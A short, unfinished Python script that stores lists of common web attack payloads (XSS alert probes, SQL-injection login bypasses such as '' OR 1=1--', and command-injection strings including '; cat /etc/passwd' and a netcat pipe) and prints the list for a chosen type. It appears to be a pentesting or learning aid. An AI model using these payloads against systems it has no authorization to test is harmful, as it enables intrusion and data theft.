#WIP

import random

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'/>",
    "<svg/onload=prompt(document.domain)>"
]

rce_payloads = [
    "; cat /etc/passwd",
    "| nc 192.168.1.1 1234",
    "&& dir"
]

sql_payloads = [
    "' OR 1=1--",
    "admin'--",
    "1 OR 1=1"
]

payloads = {
    "xss": xss_payloads,
    "rce": rce_payloads,
    "sql": sql_payloads
}

def get_payloads(vuln_type):
    if vuln_type in payloads:
        return payloads[vuln_type]
    else:
        return "Invalid vulnerability type. Available types: " + ', '.join(payloads.keys())

vuln_type = input("Enter the type of web vulnerability you want to test (xss, rce, sql): ")
print(get_payloads(vuln_type))
